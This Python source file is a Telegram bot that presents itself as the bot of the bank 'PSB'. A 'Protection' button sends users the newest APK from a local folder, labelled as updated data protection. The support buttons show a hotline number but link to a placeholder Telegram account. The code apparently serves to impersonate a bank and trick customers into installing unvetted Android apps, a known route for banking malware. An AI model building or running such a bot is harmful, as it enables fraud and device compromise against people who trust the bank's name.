from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler
import os

# Telegram токен (Heroku environment variable)
TOKEN = os.getenv("HRKU-5cd9f629-b23c-4ae5-85a9-9e63c3bd2de6")

# Функция для получения последнего APK-файла в директории
def get_latest_apk_file(directory):
    # Список файлов в директории по дате изменения
    files = sorted(
        [os.path.join(directory, f) for f in os.listdir(directory) if f.endswith(".apk")],
        key=os.path.getmtime,
        reverse=True
    )
    if files:
        return files[0]  # Возвращаем самый новый APK-файл
    else:
        return None

# Обработчик команды /start
async def start(update: Update, context):
    # Кнопки главного меню
    клавиатура = [
        [InlineKeyboardButton("Защита", callback_data='protection')],
        [InlineKeyboardButton("Поддержка", callback_data='support')]
    ]

    reply_markup = InlineKeyboardMarkup(клавиатура)

    # Приветствие
    await update.message.reply_text(
        "Добро пожаловать! Вас приветствует телеграм бот ПСБ!",
        reply_markup=reply_markup
    )

# Обработчик нажатия кнопок
async def button(update: Update, context):
    query = update.callback_query
    await query.answer()

    # Путь к папке с APK файлами
    apk_file_path = get_latest_apk_file('fileguard')  # Обновите на свою папку

    if query.data == "protection":
        # Отправляем последний APK файл
        if apk_file_path and os.path.exists(apk_file_path):
            print(f"Отправка файла: {apk_file_path}")  # Отладочный вывод
            await query.message.reply_text("Отправляю APK файл обновленной защиты данных...")
            try:
                await query.message.reply_document(document=open(apk_file_path, 'rb'))
            except Exception as e:
                await query.message.reply_text(f"Ошибка при отправке файла: {str(e)}")
        else:
            await query.message.reply_text("Файл не найден!")

    elif query.data == "support":
        # Кнопка с номером телефона, которая ведет на Telegram аккаунт
        support_buttons = [
            [InlineKeyboardButton("Связаться через Telegram", url="https://t.me/your_account")],  # Обновите ссылку
            [InlineKeyboardButton("Позвонить: 8(800)-333-03-03", url="https://t.me/your_account")]  # Обновите ссылку
        ]
        reply_markup = InlineKeyboardMarkup(support_buttons)

        await query.message.reply_text(
            "Вы выбрали Поддержку. Вы можете связаться с нами через Telegram или позвонить по номеру, нажав на кнопку ниже:",
            reply_markup=reply_markup
        )

# Основная функция для запуска бота
def main():
    application = Application.builder().token(TOKEN).build()

    # Обработчики команд и кнопок
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button))

    # Запуск бота
    application.run_polling()

if __name__ == '__main__':
    main()
